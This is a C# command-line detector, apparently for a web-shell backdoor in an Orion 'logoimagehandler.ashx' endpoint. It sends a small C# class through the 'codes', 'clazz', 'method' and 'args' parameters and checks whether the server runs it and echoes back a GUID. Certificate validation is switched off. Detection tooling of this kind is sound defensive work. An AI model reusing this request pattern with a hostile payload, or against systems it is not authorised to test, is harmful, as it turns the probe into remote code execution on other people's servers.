using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

class Program
{
	static async Task Main(string[] args)
	{
		if (args.Length < 1)
		{
			Console.WriteLine("Usage: NovaDetect.exe <Domain>");
			return;
		}

		string domain = args[0];

		if (!Uri.TryCreate(domain, UriKind.Absolute, out var uri))
		{
			Console.WriteLine("The provided url was invalid.");
			return;
		}

		//Rebuild url to ensure format
		string url = uri.Scheme + "://" + uri.Host + (uri.IsDefaultPort ? "" : ":" + uri.Port) + "/Orion/logoimagehandler.ashx";

		//Allow invalid certificates
		HttpClientHandler httpClientHandler = new HttpClientHandler()
		{
			ServerCertificateCustomValidationCallback = (a, b, c, d) => true
		};

		HttpClient httpClient = new HttpClient(httpClientHandler);

		string payloadData = @"class payload { public string test(string args) { return args; } }";

		Guid newGuid = Guid.NewGuid();

		string encodeUrl = EncodeUrl(url, new[]
		{
			("codes", payloadData),
			("clazz", "payload"),
			("method", "test"),
			("args", newGuid.ToString())
		});

		HttpRequestMessage req = new HttpRequestMessage(HttpMethod.Get, encodeUrl);

		HttpResponseMessage resp = await httpClient.SendAsync(req);
		string result = await resp.Content.ReadAsStringAsync();

		Console.Write(url);
		Console.WriteLine(result.StartsWith(newGuid.ToString()) ? " is vulnerable" : " is not vulnerable");
	}

	private static string EncodeUrl(string baseUrl, IEnumerable<(string, string)> query)
	{
		StringBuilder sb = new StringBuilder();
		sb.Append(baseUrl);

		bool isFirst = true;

		foreach ((string key, string value) in query)
		{
			sb.Append(isFirst ? '?' : '&');
			sb.Append(key).Append('=').Append(WebUtility.UrlEncode(value));

			isFirst = false;
		}

		return sb.ToString();
	}
}